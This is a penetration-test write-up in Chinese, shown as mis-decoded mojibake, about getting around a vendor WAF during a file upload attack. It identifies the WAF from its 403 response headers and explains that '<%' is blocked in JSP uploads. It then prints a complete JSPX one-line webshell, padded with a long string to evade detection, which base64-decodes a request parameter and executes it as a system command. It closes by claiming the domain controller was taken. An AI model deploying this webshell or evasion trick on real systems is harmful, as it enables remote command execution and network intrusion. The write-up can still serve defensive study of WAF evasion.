# 006-å®æˆ˜bypassç¯‡-æ–‡ä»¶ä¸Šä¼ bypassæŸæŸä¿¡waf

## **1. æ•…äº‹å‰è¨€**

åœ¨æŸæ¬¡æˆæƒé¡¹ç›®ä¸­ï¼Œä¸Šä¼ å¤„ç¢°åˆ°æŸæŸä¿¡wafï¼Œè®°ä¸‹bypassè¿‡ç¨‹ã€‚

## **2. éªŒè¯æ¼æ´**

æ•…äº‹å¼€å§‹ï¼Œç¢°åˆ°ä¸ªæŸæŸç³»ç»Ÿï¼Œä½¿ç”¨äº†xxç»„ä»¶ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚

ä¸Šä¼ JSPæ–‡ä»¶ï¼ŒéªŒè¯æ¼æ´

![](img/7a002c84e1913ecef4402c3084952f0.png)

è®¿é—®200ï¼Œä¸Šä¼ æˆåŠŸï¼Œæ¼æ´å­˜åœ¨

![](img/54a9b0635f3bb0f241db5c051f7d78f.png)

## **3. wafæ‹¦æˆª**

ä¸Šä¼ webshellï¼Œ403ï¼Œè¢«wafæ‹¦æˆªğŸ¤”ã€‚

![](img/ae6d6e40f3a8182b88529c4b858c2f8.png)

æ˜¯æˆ‘å­¤é™‹å¯¡é—»äº†ï¼Œåªé€šè¿‡403ç•Œé¢æ— æ³•åˆ†è¾¨æ˜¯ä½•æ–¹wafã€‚

![](img/4e170fc37dfa32084a39d5a19af0fc6.png)

ä½†æ˜¯è¿”å›åŒ…ä¸­çš„ä¿¡æ¯ï¼Œå‡ºå–äº†å®ƒçš„èº«ä»½ï¼Œæ˜¯æŸæŸä¿¡ç½‘ç¥wafã€‚

![](img/dc10b0f226751d5419655c15ac71b6c.png)

```http
HTTP/1.1 403 Forbidden
Server:CWAP-waf
X-Powered-By:anyu.**xin.com
```

![](img/02770cc018a0a1a49bed08d1959c2fa.png)

## **4. å°è¯•ç»•è¿‡**

å¯¹Webshellè¿›è¡ŒUnicodeç¼–ç åå†ä¸Šä¼ ï¼Œè¢«æ‹¦æˆªã€‚

![](img/6b20aacb18e926583632e9225f33fca.png)

æ‰“å°hello wordï¼Œä¸Šä¼ è¢«æ‹¦æˆªã€‚

![](img/acde07ad7115afb3403a9d41de8c545.png)

ç»è¿‡å¤šæ¬¡çš„ä¸Šä¼ æµ‹è¯•å‘ç°ï¼Œè¿™ä¸ªwafçš„è§„åˆ™è®¾å®šäº†ï¼Œå…è®¸ä¸Šä¼ JSPåç¼€çš„æ–‡ä»¶ï¼Œä½†è¯·æ±‚åŒ…ä¸­å‡ºç°<%åä¼šè¢«æ‹¦æˆªï¼Œå¦‚æœç”¨<+%æ¥æ›¿ä»£ï¼Œåˆ™æ˜¯å¯ä»¥æˆåŠŸä¸Šä¼ çš„ï¼Œä½†ä¸èƒ½è§£æã€‚å¤§æ¦‚æ‘¸æ¸…æ¥šè§„åˆ™åï¼Œæ„Ÿè§‰æ˜¯è¦å‡‰äº†ã€‚

æœç„¶ï¼Œäººç”Ÿå½“ä¸­æˆåŠŸåªæ˜¯ä¸€æ—¶çš„ï¼Œå¤±è´¥å´æ˜¯ä¸»æ—‹å¾‹ğŸ˜”ã€‚

æ€ä¹ˆå¯èƒ½ï¼ŒJSPXåç¼€è¿˜æ²¡è¯•å˜ï¼Œå“ˆå“ˆå“ˆã€‚éšä¾¿æä¸ªäº†JSPXçš„demoï¼Œå‘ç°JSPXçš„æ‹¦æˆªåŠ›åº¦å°å¾ˆå¤šï¼Œåªæ˜¯ä¿å­˜å¤±è´¥äº†ã€‚

![](img/861457972728b257a4f24c9f0ba23fe.png)

ä¸Šä¼ ä¸€å¥è¯JSPXå°é©¬ï¼Œåœ¨å°é©¬ä¸­æ’å…¥é•¿å­—ç¬¦ä¸²ç”¨æ¥é€ƒè¿‡wafæ£€æµ‹ï¼Œä¸Šä¼ æˆåŠŸã€‚

![](img/2b19542edab4e96040803faca29a0a0.png)

```java
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0"></br>
<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/></br>
<jsp:directive.page import="java.util.*"/></br>
<jsp:directive.page import="java.io.*"/></br>
<jsp:directive.page import="sun.misc.BASE64Decoder"/></br>
<jsp:scriptlet><![CDATA[</br>
        String a = "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111";</br>
	String tmp = pageContext.getRequest().getParameter("str");</br>
	if (tmp != null&&!"".equals(tmp)) {</br>
	try{</br>
		String str = new String((new BASE64Decoder()).decodeBuffer(tmp));</br>
		Process p = Runtime.getRuntime().exec(str);</br>
		InputStream in = p.getInputStream();</br>
		BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK"));</br>
		String brs = br.readLine();</br>
		while(brs!=null){</br>
			out.println(brs+"</br>");</br>
			brs = br.readLine();</br>
		}</br>
		}catch(Exception ex){</br>
			out.println(ex.toString());</br>
		}</br>
	}]]></br>
</jsp:scriptlet></br>
</jsp:root>
```

æ‹¿æï¼ŒæˆåŠŸgetshellã€‚

![](img/263e835ed635870f8848a80eba43c1e.png)

## **5. å†…ç½‘ç¯èŠ‚**

è¿™ä¸ªå†…ç½‘æ¯”è¾ƒè„†å¼±ï¼Œæ²¡å•¥æŠ€æœ¯å«é‡ï¼Œå†å²æ¼æ´å°±æ‹¿ä¸‹åŸŸæ§äº†ï¼Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†ã€‚

![](img/28009fefa84aa872940cf9a7ac437c1.png)

![](img/092f5fb8ea909aa0595743b85400800.png)